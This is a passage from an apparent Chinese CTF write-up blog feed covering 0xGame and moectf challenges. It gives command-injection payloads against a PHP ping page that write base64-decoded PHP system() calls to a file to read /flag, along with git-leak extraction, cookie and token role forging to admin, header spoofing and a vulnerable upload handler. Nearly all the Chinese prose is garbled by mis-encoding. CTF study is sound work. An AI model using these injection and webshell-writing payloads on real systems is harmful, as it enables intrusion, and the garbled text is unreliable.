class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">sanitize</span>(<span class="hljs-variable">$ip</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/&#x27;</span>, <span class="hljs-variable">$ip</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid IP Address&#x27;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ping -c 4 &#x27;</span>.<span class="hljs-variable">$ip</span>. <span class="hljs-string">&#x27; 2&gt;&amp;1&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æœç„¶;â€™ â€˜&#x2F;éƒ½è¢«ç¦äº†<br>æ²¡æœ‰&#x2F;å°±ä¸èƒ½æŸ¥çœ‹ä¸Šçº§ç›®å½•<br>ä½†æˆ‘ä»¬å¯ä»¥<strong>å†™æ–‡ä»¶</strong><br>å› ;å’Œflagè¢«ç¦ï¼Œæˆ‘ä»¬ç”¨base64ç¼–ç <br>system(â€˜lsâ€™)<br>payloadï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>=<span class="hljs-number">127.0.0.1</span>|echo%<span class="hljs-number">09</span><span class="hljs-string">&quot;PD9waHAgc3lzdGVtKCdscycpOw==&quot;</span>|base64%<span class="hljs-number">09</span>-d%<span class="hljs-number">09</span>&gt;<span class="hljs-number">2</span>.php<br></code></pre></td></tr></table></figure><p>system(â€˜ls &#x2F;â€˜)<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>|echo<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-string">&quot;PD9waHAgc3lzdGVtKCdscyAvJyk7&quot;</span>|base<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>-d<span class="hljs-meta">%</span><span class="hljs-number">09</span>&gt;<span class="hljs-number">2.</span>php<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br></code></pre></td></tr></table></figure><p>system(â€˜cat &#x2F;flagâ€™)<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>|echo<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-string">&quot;PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs=&quot;</span>|base<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>-d<span class="hljs-meta">%</span><span class="hljs-number">09</span>&gt;<span class="hljs-number">2.</span>php<br><span class="hljs-comment">//0xGame&#123;19c71976-d7d8-4ab8-9ea5-6ea3800f59f6&#125; </span><br></code></pre></td></tr></table></figure><p><strong>æ–¹æ³•äºŒ</strong><br>æ‰‹åŠ¨åˆ‡æ¢ç›®å½•è¯»å–flag<br>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>als<br><span class="hljs-comment">//html</span><br><br>ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>als<br><span class="hljs-comment">//backups cache lib local lock log mail opt run spool tmp www</span><br><br>ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>als<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><br>ip=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acd<span class="hljs-meta">%</span><span class="hljs-number">09.</span>.<span class="hljs-meta">%</span><span class="hljs-number">0</span>acat<span class="hljs-meta">%</span><span class="hljs-number">09</span>f*  <span class="hljs-comment">//flagè¢«ç¦ç”¨ç”¨f*ä»£æ›¿</span><br><span class="hljs-comment">//0xGame&#123;19c71976-d7d8-4ab8-9ea5-6ea3800f59f6&#125;</span><br></code></pre></td></tr></table></figure><h2 id="webâ€“ropo-leak"><a href="#webâ€“ropo-leak" class="headerlink" title="webâ€“ropo_leak"></a>webâ€“ropo_leak</h2><p>Noticeå‘Šè¯‰æˆ‘ä»¬ï¼šThere is noting here. Using Git for version control<br>è¯´æ˜è¿™æ˜¯gitæ³„éœ²ï¼Œè¿™é‡Œç”¨åˆ°ä¸€ä¸ªå·¥å…·Git_Extractï¼š<a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a><br>éœ€è¦ç”µè„‘æœ‰python2ç¯å¢ƒ<br>å› ä¸ºæˆ‘çš„ç”µè„‘æ˜¯python3ï¼Œæ‰€ä»¥ç”¨liunxæ‰“å¼€</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">python git_extract.py http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">184.68</span>:<span class="hljs-number">50013</span><span class="hljs-regexp">/.git/</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶<br><img src="/images/MSYOVUP75M42UT5DD3.png"><br>flagåœ¨posts&#x2F;flag&#x2F;index.htmlä¸­<br><img src="/images/IGLQ0CNEZWTUFTIVZS5.png"></p><p>ä½¿ç”¨Git_hackæœä¸å‡ºflag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>moectf</title>
    <link href="/2023/10/11/moectf/"/>
    <url>/2023/10/11/moectf/</url>
    
    <content type="html"><![CDATA[<h2 id="CLassical-Crypto-â€“-ezrot"><a href="#CLassical-Crypto-â€“-ezrot" class="headerlink" title="CLassical Crypto â€“ ezrot"></a>CLassical Crypto â€“ ezrot</h2><p>å¾—åˆ°ä¸€ä¸ªå¯†æ–‡</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;<span class="hljs-variable">@64E</span>7LC<span class="hljs-variable">@Ecf0</span><span class="hljs-symbol">:D0</span>;<span class="hljs-variable constant_">FDE020D</span><span class="hljs-symbol">:&gt;</span>!=<span class="hljs-number">60</span>=6<span class="hljs-symbol">EE6C0DF3DE:</span><span class="hljs-variable constant_">EFE</span><span class="hljs-symbol">:</span>@<span class="hljs-string">?0</span>4<span class="hljs-symbol">:</span>!96C0tsAJdEA6d;F&#125;%0N<br></code></pre></td></tr></table></figure><p>ç»è¿‡æŸ¥è¯¢å¾—çŸ¥ä½¿ç”¨çš„æ˜¯ROT5&#x2F;13&#x2F;18&#x2F;47åŠ å¯†ï¼Œä½¿ç”¨ROT47æ–¹æ³•è§£å¯†å³å¯å¾—åˆ°flag<br>flag</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;rot47_is_just_<span class="hljs-built_in">a_simPle</span>_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“http"><a href="#webâ€“http" class="headerlink" title="webâ€“http"></a>webâ€“http</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">this <span class="hljs-keyword">is</span> GET <span class="hljs-keyword">method</span>,<br><span class="hljs-title function_">your</span> <span class="hljs-title function_">mission</span>:<br><br><span class="hljs-number">1</span>.use parameter: UwU=u<br><span class="hljs-number">2</span>.post **form**: Luv=u<br><span class="hljs-number">3</span>.use admin character<br><span class="hljs-number">4</span>.request <span class="hljs-keyword">from</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-number">5</span>.use browser <span class="hljs-string">&#x27;MoeBrowser&#x27;</span><br>Complete All Missions<br></code></pre></td></tr></table></figure><p>è¿›å…¥ç¯å¢ƒä¹‹åç»™äº†æˆ‘ä»¬è¿™äº›ä»»åŠ¡ï¼Œå®Œæˆå³å¯<br>ç¬¬ä¸€ä¸ª<br>GET:?UwU&#x3D;u<br>ç¬¬äºŒä¸ª<br>POST:<br>Luv&#x3D;u<br>ç¬¬ä¸‰ä¸ª<br>burpæŠ“åŒ…æŠŠcookieé‡Œçš„character&#x3D;guestæ”¹ä¸ºadmin<br>ç¬¬å››ä¸ª<br>ç»§ç»­æŠ“åŒ…ï¼Œåœ¨ä¸‹é¢ç©ºè¡Œé‡ŒåŠ ä¸€ä¸ªX-forwarded-for: 127.0.0.1<br><strong>æ³¨ï¼šX-forwarded-for: 127.0.0.1è¦æ’åˆ°å‰é¢ï¼Œæ’åˆ°åé¢çš„è¯ä¼šåŠ è½½ä¸å‡ºæ¥ï¼Œä¸åˆ°ä»€ä¹ˆåŸç†ğŸ¥¶</strong><br>ç¬¬äº”ä¸ª<br>ä¿®æ”¹UAå¤´æ¢æˆMoeBrowserå³å¯<br>Brilliant! Now I give you my flag: moectf{basic_http_knowledge_S0y4sE6ZlBM9RDemgwzNI0BOR4E4CJ7U}</p><h2 id="webâ€“webå…¥é—¨æŒ‡åŒ—"><a href="#webâ€“webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="webâ€“webå…¥é—¨æŒ‡åŒ—"></a>webâ€“webå…¥é—¨æŒ‡åŒ—</h2><p>ä¸‹è½½ä¸€ä¸ªzipæ–‡ä»¶<br>æ‰“å¼€æ˜¯ä¸ªpdfï¼Œå…¶ä»–çš„ä¸ç”¨ç®¡ï¼Œç›´æ¥ç¿»åˆ°æœ€ä¸‹é¢</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">666</span><span class="hljs-keyword">c</span><span class="hljs-number">61673</span>d<span class="hljs-number">6257396</span><span class="hljs-keyword">c</span><span class="hljs-number">5933526</span>d<span class="hljs-number">6533637</span>a<span class="hljs-number">62454e7662575666564739666257396</span><span class="hljs-keyword">c</span><span class="hljs-number">513152475831637959</span><br><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">396</span>a<span class="hljs-number">61474673624756755</span>a<span class="hljs-number">3055684958303</span>d<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¸€ç•ªä»£ç <br>å…ˆå­—ç¬¦è§£ç ï¼Œè·å¾—å¦‚ä¸‹</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">flag</span><span class="hljs-operator">=</span>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>è¯•ä¸€ä¸‹æœ€å¸¸ç”¨çš„base64</p><p>è·å–<br><code>moectf&#123;w3lCome_To_moeCTF_W2b_challengE!!&#125;</code></p><h2 id="webâ€“å½¼å²¸çš„flag"><a href="#webâ€“å½¼å²¸çš„flag" class="headerlink" title="webâ€“å½¼å²¸çš„flag"></a>webâ€“å½¼å²¸çš„flag</h2><p>hintè¯´ç²—å¿ƒçš„å‡ºé¢˜äººåœ¨è¿™ä¸ªèŠå¤©å¹³å°ä¸å°å¿ƒæ³„éœ²äº†è‡ªå·±çš„flag<br>ç„¶åæœäº†åŠå¤©cmsè¯†åˆ«å’Œicoæ–‡ä»¶<br>ç»“æœæ²¡æƒ³åˆ°flagç«Ÿç„¶è—åœ¨äº†æºç é‡Œã€‚ã€‚ã€‚</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ç»è¿‡trackerï¼Œç ´è·å‡ºå†…å®¹ä¸ºmoectf</span><span class="hljs-template-variable">&#123;find_comments_xlOHEvYhaGNpeEdzZmoT5gIb4CS3ZPmY&#125;</span><br></code></pre></td></tr></table></figure><p>ç«Ÿç„¶æ˜¯æ’¤å›çš„æ¶ˆæ¯</p><h2 id="webâ€“cookie"><a href="#webâ€“cookie" class="headerlink" title="webâ€“cookie"></a>webâ€“cookie</h2><p>å‹ç¼©åŒ…å†…å®¹å¦‚ä¸‹</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">## ä¸€äº›apiè¯´æ˜<br><br>æ³¨å†Œ `POST /register`<br>json<br>&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;koito&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>&#125;<br><br><br>ç™»å½• `POST /login`<br>json<br>&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;koito&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span><br>&#125;<br><br><br>è·å–flag `GET /flag`<br><br>æŸ¥è¯¢æœåŠ¡çŠ¶æ€ `GET /status`<br></code></pre></td></tr></table></figure><p>å…ˆç™»å½•&#x2F;register<br>æ³¨å†Œä¸€ä¸‹<br>hintè¯´äº†readmeåªæ˜¯ä¸€ä¸ªæ ·ä¾‹ï¼Œä¸æ˜¯æ‹¿æ¥å¤åˆ¶çš„<br>æˆ‘ä»¬æŠŠå‚æ•°æ”¹ä¸€æ”¹<br>POSTæäº¤</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;zijie&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123456&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>errorä¸dataéƒ½æ˜¯okï¼Œæ²¡é—®é¢˜<br>ç„¶å&#x2F;loginå†é‡å¤æ“ä½œ<br>å¦‚æœä½¿ç”¨çš„æ˜¯burpæŠ“åŒ…ï¼Œå»ºè®®è¿›å…¥&#x2F;flagåæ£€æŸ¥ä¸€ä¸‹æ˜¯POSTè¿˜æ˜¯GETï¼ŒREADMEç»™æˆ‘ä»¬çš„æ˜¯GET,é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨GETï¼Œè¿›å…¥flagåé¡µé¢æç¤º{â€œerrorâ€: â€œokâ€, â€œdataâ€: {â€œflagâ€: â€œflag{sorry_but_you_are_not_admin}â€}}<br>è¿™é‡Œæˆ‘ä»¬æ”¹ä¸€ä¸‹cookieé‡Œçš„tokenï¼Œå¦‚æœæŠ“åˆ°äº†character&#x3D;guest;éœ€è¦æŠŠguestä¹Ÿæ”¹ä¸ºadmin<br>tokenä½¿ç”¨base64ç¼–ç ï¼Œè§£ç åä¸º</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;zijie&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;123456&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å°†useræ”¹ä¸ºadminåé‡æ–°base64ç¼–ç æ”¾å›token<br>æˆåŠŸè·å–flag</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ok&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;flag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;moectf&#123;cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Classical-Crypto-â€“çš‡å¸çš„æ–°å¯†ç "><a href="#Classical-Crypto-â€“çš‡å¸çš„æ–°å¯†ç " class="headerlink" title="Classical Crypto â€“çš‡å¸çš„æ–°å¯†ç "></a>Classical Crypto â€“çš‡å¸çš„æ–°å¯†ç </h2><p>æ‰“å¼€å‹ç¼©åŒ…å¾—åˆ°ä¸€ä¸ªå¯†æ–‡</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">tvljam</span><span class="hljs-template-variable">&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></code></pre></td></tr></table></figure><p>å‘ç°è¿™æ˜¯å‡¯æ’’å¯†ç ï¼Œå‘ç°ä¸€ä¸ªæ–°çš„è§£å¯†ç½‘ç«™ï¼Œå®ƒå¯ä»¥æŠŠç»“æœéƒ½åˆ—å‡ºæ¥<br><a href="https://tool.bugku.com/jiemi/">ä¼ é€é—¨</a></p><p>æ‰¾åˆ°moectfçš„flagæ¨¡æ¿</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">moectf&#123;CaEsaE_CIphEr_Is_<span class="hljs-built_in">a_vErY</span>_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;<br></code></pre></td></tr></table></figure><h2 id="webâ€“moeå›¾åºŠ"><a href="#webâ€“moeå›¾åºŠ" class="headerlink" title="webâ€“moeå›¾åºŠ"></a>webâ€“moeå›¾åºŠ</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œurlè¾“å…¥&#x2F;upload.phpå¯ä»¥æŸ¥çœ‹æºç ï¼Œæˆ–è€…å¯ä»¥burpsuiteæŠ“åŒ…ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶çš„nameå‚æ•°åé¡µé¢ä¼šå›æ˜¾æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$targetDir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-variable">$allowedExtensions</span> = [<span class="hljs-string">&#x27;png&#x27;</span>];<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$tmp_path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;type&#x27;</span>] !== <span class="hljs-string">&#x27;image/png&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$tmp_path</span>) &gt; <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ–‡ä»¶å¤ªå¤§&#x27;</span>]));<br>    &#125;<br><br>    <span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$fileNameParts</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$fileName</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$fileNameParts</span>) &gt;= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-variable">$secondSegment</span> = <span class="hljs-variable">$fileNameParts</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$secondSegment</span> !== <span class="hljs-string">&#x27;png&#x27;</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));<br>    &#125;<br><br>    <span class="hljs-variable">$uploadFilePath</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$targetDir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_path</span>, <span class="hljs-variable">$uploadFilePath</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;file_path&#x27;</span> =&gt; <span class="hljs-variable">$uploadFilePath</span>]));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ–‡ä»¶ä¸Šä¼ å¤±è´¥&#x27;</span>]));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>expload()å‡½æ•°ä¸ºæŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">if</span> ($secondSegment !== <span class="hljs-string">&#x27;png&#x27;</span>) &#123;<br>            die(json_encode([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-keyword">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ–‡ä»¶åç¼€ä¸ç¬¦åˆè¦æ±‚&#x27;</span>]));<br>        &#125;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šæºä»£ç 